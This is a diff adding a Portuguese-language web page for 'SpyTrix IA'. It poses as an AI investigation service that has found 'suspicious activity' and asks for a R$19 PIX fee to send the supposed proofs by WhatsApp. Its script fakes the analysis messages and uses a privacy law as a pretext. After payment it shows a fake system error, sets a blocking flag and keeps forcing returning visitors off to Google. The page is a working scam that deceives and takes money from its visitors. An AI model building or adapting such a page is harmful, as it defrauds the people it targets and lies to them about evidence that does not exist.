@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SpyTrix IA - Análise Final</title>
+  <link rel="stylesheet" href="/css/ia-style.css" />
+  <style>
+    #pix-container {
+      display: none;
+      text-align: center;
+      margin-top: 3rem;
+    }
+
+    #pix-container button {
+      padding: 1rem 2rem;
+      font-size: 1.2rem;
+      background-color: #00ffc3;
+      color: black;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ffc3;
+    }
+
+    #janela-pix {
+      display: none;
+      width: 100%;
+      height: 600px;
+      margin-top: 20px;
+    }
+
+    #janela-pix iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .chat-container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+
+    .chat-box {
+      background: black;
+      color: #00ffc3;
+      border: 2px solid #00ffc3;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00ffc3;
+      min-height: 300px;
+      font-family: monospace;
+    }
+
+    .chat-msg {
+      margin-bottom: 1rem;
+      animation: fadeIn 0.4s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .chat-options, .chat-input {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .chat-input input {
+      padding: 1rem;
+      font-size: 1rem;
+      border: 2px solid #00ffc3;
+      border-radius: 5px;
+      background: #111;
+      color: #00ffc3;
+    }
+
+    .chat-input button {
+      padding: 1rem;
+      background: #00ffc3;
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    /* Estilo do Popup */
+    #popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 1.5rem;
+      text-align: center;
+    }
+
+    #popup p {
+      margin: 20px 0;
+    }
+
+    #popup button {
+      padding: 1rem 2rem;
+      background: #00ffc3;
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1611670182885767');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1611670182885767&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+
+  <div class="chat-container">
+    <div id="chat-box" class="chat-box"></div>
+
+    <div id="question-options" style="display: none;" class="chat-options">
+      <p>Você pode fazer 3 perguntas sobre o caso. A IA responderá cada uma.</p>
+      <button onclick="startQuestions()">Fazer 3 perguntas</button>
+      <button onclick="skipQuestions()">Baixar Provas!</button>
+    </div>
+
+    <div id="question-input" style="display: none;" class="chat-input">
+      <input type="text" id="user-question" placeholder="Digite sua pergunta" />
+      <button onclick="submitQuestion()">Enviar</button>
+    </div>
+
+    <!-- PIX checkout -->
+    <div id="pix-container">
+      <button onclick="fbq('trackCustom', 'GerarTaxaDeEnvio'); abrirCheckout()">💳 Gerar Taxa de Envio</button>
+      <div id="janela-pix">
+        <iframe id="iframe-pix"></iframe>
+      </div>
+    </div>
+  </div>
+
+  <!-- Popup de bloqueio -->
+  <div id="popup">
+    <div>
+      <p>Após o pagamento da taxa de envio, aguarde até 5 minutos para confirmação do pagamento.</p>
+      <p>Após esse tempo, será enviado tudo para o whatsapp fornecido no ato da taxa!.</p>
+      <button onclick="fecharPopup()">Fechar</button>
+    </div>
+  </div>
+
+  <script>
+    const messages = [
+      "Analisando os dados...",
+      "Detectamos atividades suspeitas."
+    ];
+    const flowAfterQuestions = [
+      "Devido à LGPD (Lei nº 13.709/2018), não podemos exibir as provas diretamente aqui.",
+      "Podemos enviar todas as provas por WhatsApp. Por favor, informe o seu número no ato da taxa para fazer o envio das provas.",
+      "Para manter nossos servidores, cobramos uma taxa simbólica de R$19,00."
+    ];
+
+    let index = 0;
+    let questionStep = 0;
+
+    function showMessage() {
+      if (index < messages.length) {
+        appendToChat(messages[index]);
+        index++;
+        setTimeout(showMessage, 2500);
+      } else {
+        document.getElementById('question-options').style.display = 'block';
+      }
+    }
+
+    function startQuestions() {
+      document.getElementById('question-input').style.display = 'flex';
+    }
+
+    function skipQuestions() {
+      document.getElementById('question-options').style.display = 'none';
+      continueFlow();
+    }
+
+    function submitQuestion() {
+      const input = document.getElementById('user-question');
+      const question = input.value.trim();
+      if (!question) return;
+
+      appendToChat(`👤 Você: ${question}`);
+      input.value = '';
+      document.getElementById('user-question').disabled = true;
+
+      fetch('/chat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: question })
+      })
+      .then(res => res.json())
+      .then(data => {
+        appendToChat(`🤖 SpyTrix: ${data.reply}`);
+        questionStep++;
+
+        if (questionStep >= 3) {
+          document.getElementById('question-options').style.display = 'none';
+          document.getElementById('question-input').style.display = 'none';
+          continueFlow();
+        } else {
+          document.getElementById('user-question').disabled = false;
+          document.getElementById('user-question').focus();
+        }
+      });
+    }
+
+    function appendToChat(text) {
+      const chatBox = document.getElementById('chat-box');
+      const p = document.createElement('p');
+      p.textContent = text;
+      p.classList.add('chat-msg');
+      chatBox.appendChild(p);
+      chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function continueFlow() {
+      let delay = 1000;
+      flowAfterQuestions.forEach((msg, i) => {
+        setTimeout(() => {
+          appendToChat(`🤖 SpyTrix: ${msg}`);
+          if (i === flowAfterQuestions.length - 1) {
+            setTimeout(() => {
+              document.getElementById('pix-container').style.display = 'block';
+            }, 2500);
+          }
+        }, delay * (i + 1));
+      });
+    }
+
+    function abrirCheckout() {
+      const linkCheckout = "https://app.pushinpay.com.br/service/pay/9DCD3A10-C4B5-4619-97B3-089F440CFB42";
+      document.getElementById('iframe-pix').src = linkCheckout;
+      document.getElementById('janela-pix').style.display = 'block';
+
+      // Exibe o popup após 30 segundos
+      setTimeout(() => {
+        document.getElementById('popup').style.display = 'flex';
+      }, 50000); // 30 segundos
+    }
+
+    function fecharPopup() {
+      document.getElementById('popup').style.display = 'none';
+
+      // Bloqueia o acesso após 5 minutos
+      setTimeout(() => {
+        localStorage.setItem('bloqueado', 'true');
+        alert("Algo deu Errado no nosso sitema.");
+        window.location.href = "https://www.google.com"; // Redireciona para o Google
+      }, 300000); // 5 minutos
+    }
+
+    // Checa se o usuário está bloqueado
+    if (localStorage.getItem('bloqueado') === 'true') {
+      // Impede o usuário de voltar para a página
+      history.pushState(null, null, location.href);
+      history.back();
+      history.forward();
+
+      // Redireciona o usuário para o Google, caso ele tente voltar
+      setInterval(function() {
+        window.location.href = "https://www.google.com";
+      }, 100);
+    }
+
+    window.onload = showMessage;
+  </script>
+</body>
+</html>
